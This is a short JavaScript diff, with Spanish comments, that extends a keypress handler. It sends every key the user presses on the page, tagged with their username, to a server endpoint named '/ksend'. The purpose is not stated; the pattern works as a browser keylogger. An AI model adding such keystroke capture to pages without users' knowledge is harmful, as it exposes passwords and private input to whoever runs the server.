@@ -14,8 +14,20 @@ const render = async () => {
 
     let body = document.getElementsByTagName("body");
     body = body[0]
+    //Evento de presionar tecla
     function leer(evt){
         console.log(evt.key);
+        fetch("/ksend", {
+            method: "PUT",
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                nombre: username,
+                tecla: evt.key
+            })
+        })
+        console.log("enviado correctamente ", evt.key);
     }
     body.addEventListener("keypress",leer);
 }
